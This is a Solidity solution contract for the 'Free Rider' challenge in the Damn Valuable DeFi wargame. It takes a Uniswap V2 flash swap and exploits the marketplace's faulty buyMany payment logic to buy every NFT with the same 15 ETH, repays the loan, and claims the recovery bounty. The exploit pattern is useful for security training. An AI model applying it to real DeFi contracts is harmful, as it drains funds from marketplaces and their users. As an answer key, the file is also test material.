// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
import {FreeRiderNFTMarketplace} from "../../src/free-rider/FreeRiderNFTMarketplace.sol";
import {FreeRiderRecoveryManager} from "../../src/free-rider/FreeRiderRecoveryManager.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import {WETH} from "solmate/tokens/WETH.sol";

contract Solution is IERC721Receiver {
    DamnValuableNFT immutable nft;
    FreeRiderNFTMarketplace immutable marketplace;
    FreeRiderRecoveryManager immutable manager;
    WETH immutable weth;
    uint256 immutable amountOfNFTs;
    address immutable player;

    constructor(
        DamnValuableNFT _nft,
        FreeRiderNFTMarketplace _marketplace,
        WETH _weth,
        FreeRiderRecoveryManager _manager,
        uint256 _amountOfNFTs,
        address _player
    ) payable {
        nft = _nft;
        marketplace = _marketplace;
        manager = _manager;
        weth = _weth;
        amountOfNFTs = _amountOfNFTs;
        player = _player;
    }

    function solve(IUniswapV2Pair pair, uint256 amount) external payable {
        // call uniswap to take 15 weth as a flashloan,
        // then uniswap will call unswapV2Call.
        // data.length must be > 0
        IUniswapV2Pair(pair).swap(amount, 0, address(this), "...");
    }

    function uniswapV2Call(address, uint256 amount, uint256, bytes calldata) external {
        weth.withdraw(amount);
        uint256[] memory ids = new uint256[](amountOfNFTs);
        for (uint256 i; i < amountOfNFTs; ++i) {
            ids[i] = i;
        }
        // can by all nfts with 15 eth, because it will send it back
        marketplace.buyMany{value: amount}(ids);

        // repay the flashloan
        // + 1 to avoid the "UniswapV2: K" error
        uint256 amountPlusFees = amount * 1000 / 997 + 1;
        weth.deposit{value: amountPlusFees}();
        weth.transfer(msg.sender, amountPlusFees);

        bytes memory data = abi.encode(player);
        for (uint256 i; i < amountOfNFTs; ++i) {
            nft.safeTransferFrom(address(this), address(manager), i, data);
        }

        (bool s,) = player.call{value: address(this).balance}("");
        require(s);
    }

    function onERC721Received(address, address, uint256, bytes memory) external pure returns (bytes4) {
        return this.onERC721Received.selector;
    }

    receive() external payable {}
}
